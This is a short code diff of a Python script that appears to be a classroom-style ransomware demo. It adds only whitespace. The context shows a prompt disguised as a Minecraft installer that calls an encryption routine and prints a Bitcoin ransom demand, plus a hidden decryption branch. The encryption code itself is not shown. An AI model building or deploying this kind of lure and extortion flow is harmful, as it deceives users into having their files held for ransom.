@@ -96,6 +96,7 @@ gotcha = input('Install Minecraft? (y/n)')
 if gotcha == 'y':
     BooeyEncryption()
     print('Sike! Your files have been encrypted! Please send $100000 worth of BTC to bababooey@champlain.edu to obtain the decryption key')
+
 else:
     entDyc = input('Enter developer options? (y/n)')
     if entDyc == 'y':
@@ -103,6 +104,7 @@ else:
 
         if paymentMade == 'y':
             BooeyDecryption()
+            
         else:
             print('Sorry, no dice!')
             exit
